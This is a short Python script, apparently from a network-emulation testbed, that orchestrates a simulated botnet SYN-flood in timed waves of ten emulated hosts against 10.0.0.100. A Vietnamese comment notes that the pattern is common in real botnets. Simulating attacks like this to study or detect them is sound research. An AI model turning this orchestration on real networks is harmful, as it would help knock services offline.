# attack/wave_attack.py

import time


def run(net, target="10.0.0.100", wave_size=10, delay=8):

    print("\nStarting WAVE botnet attack\n")

    bot_ids = list(range(1, 51))

    waves = len(bot_ids) // wave_size

    for w in range(waves):

        print(f"Wave {w+1}")

        start = w * wave_size
        end = start + wave_size

        for i in bot_ids[start:end]:

            bot = net.get(f"h{i}")

            bot.cmd(f"python3 traffic/syn_flood.py {target} &")

            print("Bot", i, "attacking")

        print("Wave pause\n")

        time.sleep(delay)

    print("Wave attack finished\n")

'''Mô phỏng botnet tấn công theo từng đợt (wave).

Đặc điểm:
10 bots → attack
pause
10 bots tiếp → attack
pause

Pattern này rất phổ biến trong botnet thật.'''